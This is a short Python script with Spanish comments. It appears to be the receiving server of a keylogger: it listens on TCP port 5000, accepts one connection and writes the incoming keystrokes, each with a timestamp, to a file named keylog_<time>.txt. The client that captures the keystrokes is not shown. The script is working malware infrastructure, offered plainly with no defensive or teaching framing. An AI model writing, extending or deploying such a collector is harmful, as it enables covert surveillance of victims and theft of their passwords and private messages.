import socket
from datetime import datetime

# Crear un nombre de archivo con la fecha y hora actual
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = f"keylog_{timestamp}.txt"

# Configuración del servidor
host= '0.0.0.0'
port = 5000

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(1)

print(f"[+] Esperando conexión en {host}:{port}...")
client_socket, addr = server_socket.accept()
print(f"[+] Conexión establecida desde {addr}")
print(f"[+] Guardando en archivo: {log_file}")

# Guardar teclas en archivo con timestamp
with open(log_file, "w") as f:
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            decoded = data.decode()

            # Agregar línea con hora exacta
            time_tag = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            f.write(time_tag + decoded)
    except Exception as e:
        pass
    finally:
        client_socket.close()
        server_socket.close()
        print("[+] Conexión cerrada")
